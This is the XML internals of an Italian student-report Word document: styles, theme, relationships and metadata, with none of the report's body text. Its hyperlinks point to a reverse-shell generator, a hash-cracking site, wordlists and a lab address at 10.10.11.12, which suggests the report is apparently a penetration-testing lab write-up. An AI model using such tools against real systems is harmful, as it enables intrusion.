    <w:uiPriority w:val="9"/>
    <w:name w:val="heading 4"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:unhideWhenUsed/>
    <w:link w:val="Heading4Char"/>
    <w:qFormat/>
    <w:rsid w:val="21040C4D"/>
    <w:rPr>
      <w:rFonts w:ascii="Constantia" w:hAnsi="Constantia" w:eastAsia="" w:cs="" w:asciiTheme="majorAscii" w:hAnsiTheme="majorAscii" w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
      <w:i w:val="1"/>
      <w:iCs w:val="1"/>
      <w:color w:val="2F1B15"/>
    </w:rPr>
    <w:pPr>
      <w:keepNext w:val="1"/>
      <w:keepLines w:val="1"/>
      <w:spacing w:before="40" w:after="0"/>
      <w:outlineLvl w:val="3"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading7">
    <w:uiPriority w:val="9"/>
    <w:name w:val="heading 7"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:unhideWhenUsed/>
    <w:link w:val="Heading7Char"/>
    <w:qFormat/>
    <w:rsid w:val="21040C4D"/>
    <w:rPr>
      <w:rFonts w:ascii="Constantia" w:hAnsi="Constantia" w:eastAsia="" w:cs="" w:asciiTheme="majorAscii" w:hAnsiTheme="majorAscii" w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
      <w:i w:val="1"/>
      <w:iCs w:val="1"/>
      <w:color w:val="1F120E"/>
    </w:rPr>
    <w:pPr>
      <w:keepNext w:val="1"/>
      <w:keepLines w:val="1"/>
      <w:spacing w:before="40" w:after="0"/>
      <w:outlineLvl w:val="6"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Quote">
    <w:uiPriority w:val="29"/>
    <w:name w:val="Quote"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:link w:val="QuoteChar"/>
    <w:qFormat/>
    <w:rsid w:val="21040C4D"/>
    <w:rPr>
      <w:i w:val="1"/>
      <w:iCs w:val="1"/>
      <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF" w:themeShade="FF"/>
    </w:rPr>
    <w:pPr>
      <w:spacing w:before="200"/>
      <w:ind w:left="864" w:right="864"/>
      <w:jc w:val="center"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="IntenseQuote">
    <w:uiPriority w:val="30"/>
    <w:name w:val="Intense Quote"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:link w:val="IntenseQuoteChar"/>
    <w:qFormat/>
    <w:rsid w:val="21040C4D"/>
    <w:rPr>
      <w:i w:val="1"/>
      <w:iCs w:val="1"/>
      <w:color w:val="3F251D" w:themeColor="accent1" w:themeTint="FF" w:themeShade="FF"/>
    </w:rPr>
    <w:pPr>
      <w:spacing w:before="360" w:after="360"/>
      <w:ind w:left="864" w:right="864"/>
      <w:jc w:val="center"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListParagraph">
    <w:uiPriority w:val="34"/>
    <w:name w:val="List Paragraph"/>
    <w:basedOn w:val="Normale"/>
    <w:qFormat/>
    <w:rsid w:val="21040C4D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glossaryDocument" Target="glossary/document.xml" Id="rId13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fontTable" Target="fontTable.xml" Id="rId12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footer" Target="footer1.xml" Id="rId11" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/webSettings" Target="webSettings.xml" Id="rId5" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image2.png" Id="rId10" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings" Target="settings.xml" Id="rId4" /><Relationship Type="http://schemas.microsoft.com/office/2007/relationships/hdphoto" Target="media/hdphoto1.wdp" Id="rId9" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml" Id="rId14" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.revshells.com" TargetMode="External" Id="R8bdf7e41c8b8461d" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.crackstation.net/" TargetMode="External" Id="R55d5015335d1492a" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.urlencoder.io" TargetMode="External" Id="Rff34c41f63134980" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image3.png" Id="R30a774142d534680" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image4.png" Id="Rcd37844bde8d4ac5" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image5.png" Id="R10295231b5a0447a" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image6.png" Id="Rb7fabd9572d74cf1" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image7.png" Id="R9e0fbf98eea8461b" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image8.png" Id="Rfedfa1c652a64626" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image9.png" Id="Re53a71a9b8f14881" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/imagea.png" Id="R6c7698b2f75a4828" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/imageb.png" Id="R6609e394f36d4136" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/imagec.png" Id="Rf66363428be040a2" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/imaged.png" Id="R64c0f259121041f5" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/imagee.png" Id="R70f545eb6c51405c" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/imagef.png" Id="R1e3c4f41aae64cf7" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image10.png" Id="R11c8e57b0c234ca5" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://10.10.11.12:80" TargetMode="External" Id="Rb42dd3eca7874a5c" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image11.png" Id="R9550175821524279" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://10.10.11.12:80" TargetMode="External" Id="Rcf66112b7fd440ef" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://wordlists.assetnote.io/" TargetMode="External" Id="R0d30e4340fee4db3" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image12.png" Id="Rfc30252b82c046b4" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image13.png" Id="Rbca486663e7f4657" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image14.png" Id="R9144992fbeae4ce9" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image15.png" Id="R4688a9bfdf8c41cc" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image16.png" Id="Rcb14b4be089d4276" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image17.png" Id="R92fb85c29609474c" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image18.png" Id="R53f0b3a1ac73441a" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image19.png" Id="R2ebfe7ba5ad3432e" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image1a.png" Id="Rad8edda760794f7b" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image1b.png" Id="Ra593ee93dcba43df" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image1c.png" Id="R08ced9d25244487f" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image1d.png" Id="Rb0f42eca706d412f" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image1e.png" Id="R5db16cc34727435a" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image1f.png" Id="R0d7ea4f16a8c4f6c" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image20.png" Id="R519bc793d5bf444f" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image21.png" Id="R27a7b34b5aef4117" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image22.png" Id="R376c28babf0546f9" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image23.png" Id="Rdea3c22488e849dc" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image24.png" Id="R27ae43f04e554a36" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image25.png" Id="Re4346bf06cd44f86" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image26.png" Id="R20ea241461d04359" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image27.png" Id="Ra90d1502135f4460" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image28.png" Id="Re52367ac1a284a37" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image29.png" Id="Rcddd4b5cbc0f4c4c" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image2a.png" Id="R2307454a28a24e01" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image2b.png" Id="R06632285c13942fb" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image2c.png" Id="R67a720ead3e84648" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.revshells.com/" TargetMode="External" Id="Ra1558f1af18c4c35" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image2d.png" Id="R74e1cb79ee2c401f" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image2e.png" Id="Rd03ff6b664f04e46" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image2f.png" Id="Ra2d5dc2c50c5408f" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image30.png" Id="R2dfc6da391374154" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image31.png" Id="R9487b9ec4fb8469c" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image32.png" Id="R881860437d5848f5" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image33.png" Id="R16c0f4d2845b4764" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image34.png" Id="R47e0150256324893" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image35.png" Id="Raaa51e119cc7415a" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.crackstation.net" TargetMode="External" Id="R3bebe290d9994126" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image36.png" Id="R115f3a6a80694f77" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image37.png" Id="R9accc46b38c4413e" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image38.png" Id="R881d5ceeb8444661" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image39.png" Id="R06f7724324014a8f" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image3a.png" Id="Rdede6581cce44dda" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image3b.png" Id="R7e6f455bb6d747f8" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image3c.png" Id="R116cdeecd47f45dc" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/media/image3d.png" Id="Rb5fc325acd154cb2" /><Relationship Type="http://schemas.microsoft.com/office/2020/10/relationships/intelligence" Target="intelligence2.xml" Id="R419a092d61674f02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artesio\AppData\Roaming\Microsoft\Templates\Relazione%20studente%20con%20copertina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573BCD9F82842B59CB64A476EFD06A0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B6A3F983-58EE-45E4-9B4C-B6D91D0EC289}"/>
      </w:docPartPr>
      <w:docPartBody>
        <w:p w:rsidR="00471B9B" w:rsidP="00CD418A" w:rsidRDefault="00CD418A">
          <w:pPr>
            <w:pStyle w:val="4573BCD9F82842B59CB64A476EFD06A0"/>
          </w:pPr>
          <w:r>
            <w:rPr>
              <w:lang w:bidi="it-IT"/>
            </w:rPr>
            <w:t>Corso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75781F0C"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:pStyle w:val="Puntoelenco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 w16cid:durableId="1603682693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F85"/>
    <w:rsid w:val="00034DBF"/>
    <w:rsid w:val="00321055"/>
    <w:rsid w:val="003C7B66"/>
    <w:rsid w:val="00471B9B"/>
    <w:rsid w:val="006742B1"/>
    <w:rsid w:val="00884FA6"/>
    <w:rsid w:val="009E40BF"/>
    <w:rsid w:val="00CD418A"/>
    <w:rsid w:val="00D55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untoelenco">
    <w:name w:val="List Bullet"/>
    <w:basedOn w:val="Normale"/>
    <w:uiPriority w:val="7"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="1"/>
      </w:numPr>
      <w:spacing w:before="120" w:after="200" w:line="264" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="0E2841" w:themeColor="text2"/>
      <w:lang w:eastAsia="ja-JP"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="4573BCD9F82842B59CB64A476EFD06A0">
    <w:name w:val="4573BCD9F82842B59CB64A476EFD06A0"/>
    <w:rsid w:val="00CD418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Student Report">
  <a:themeElements>
    <a:clrScheme name="Student Report">
      <a:dk1>
        <a:sysClr val="windowText" lastClr="000000"/>
      </a:dk1>
      <a:lt1>
        <a:sysClr val="window" lastClr="FFFFFF"/>
      </a:lt1>
      <a:dk2>
        <a:srgbClr val="4D322D"/>
      </a:dk2>
      <a:lt2>
        <a:srgbClr val="EFF4EC"/>
      </a:lt2>
      <a:accent1>
        <a:srgbClr val="3F251D"/>
      </a:accent1>
      <a:accent2>
        <a:srgbClr val="76A35D"/>
      </a:accent2>
      <a:accent3>
        <a:srgbClr val="CD532D"/>
      </a:accent3>
      <a:accent4>
        <a:srgbClr val="C78600"/>
      </a:accent4>
      <a:accent5>
        <a:srgbClr val="864F3D"/>
      </a:accent5>
      <a:accent6>
        <a:srgbClr val="5F7791"/>
      </a:accent6>
      <a:hlink>
        <a:srgbClr val="993E21"/>
      </a:hlink>
      <a:folHlink>
        <a:srgbClr val="956400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0166EC-C93B-4AD9-AA1B-3864612B006A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Relazione studente con copertina.dotx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creator>Raffaele Pizzolante</dc:creator>
  <keywords/>
  <lastModifiedBy>ANTONIO ALLOCCA</lastModifiedBy>
  <revision>6</revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2019-12-02T20:03:00.0000000Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2024-06-06T15:20:31.3349524Z</dcterms:modified>
  <version/>
</coreProperties>
</file>